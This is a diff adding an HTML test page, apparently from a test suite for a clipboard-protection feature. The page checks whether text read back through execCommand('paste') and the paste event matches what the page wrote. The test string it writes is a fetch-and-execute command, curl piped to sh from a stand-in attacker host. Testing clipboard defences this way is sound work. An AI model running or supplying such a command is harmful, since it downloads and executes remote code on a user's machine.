@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8"><title>Read-back via execCommand(paste) and the paste event</title>
+<script src="common.js"></script></head>
+<body><h1>Read-back via execCommand(paste) and the paste event</h1>
+<button id="go">Check</button>
+<textarea id="sink" rows="2" cols="60"></textarea>
+<script>
+let pasteSeen = null;
+const sink = document.getElementById("sink");
+// The paste event's DataTransfer is another read-back route.
+sink.addEventListener("paste", e => {
+  pasteSeen = e.clipboardData.getData("text/plain");
+});
+document.getElementById("go").addEventListener("click", async () => {
+  await window.__clipguard.writeText("curl -s https://evil.invalid/ep | sh");
+  sink.focus();
+  try {
+    document.execCommand("paste");
+  } catch (e) {}
+  // Both the pasted value and the paste-event DataTransfer should be the page's own text.
+  window.__clipguardResult.read = sink.value || pasteSeen || "";
+  window.__clipguardResult.pasteEvent = pasteSeen;
+  window.__clipguardResult.done = true;
+});
+</script>
+</body></html>
